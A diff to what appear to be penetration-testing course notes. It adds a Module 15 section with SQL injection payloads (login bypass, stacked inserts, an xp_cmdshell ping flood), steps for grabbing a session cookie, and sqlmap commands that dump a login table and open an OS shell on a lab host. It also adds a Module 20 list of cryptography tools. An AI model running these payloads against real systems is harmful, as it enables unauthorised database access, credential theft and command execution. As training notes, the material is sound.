@@ -213,11 +213,33 @@ Module 4 - Enumeration
     
     Module 15 - SQL Injection
     
+    blah' or 1=1 --
+    blah';insert into login values('jon','pass'); --
+    blah';create database newdb; --
+    blah';'exec master_xp_cmdshell 'ping 10.10.10.12 -l 65000 -t; --
+    
+    NStalker
+    
+    inspect element
+        console
+           document.cookie
+           
+    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --dbs
+    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname --tables
+    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --columns
+    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --dump
+    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
     
     
+    Module 20 - Cryptography
     
-    
-    
+    HashCalc
+    md5calc
+    cryptoforge
+    BCTextEncoder
+    IIS Self Signed Certs
+    VeraCrypt
+    CrypTool
     
     
     
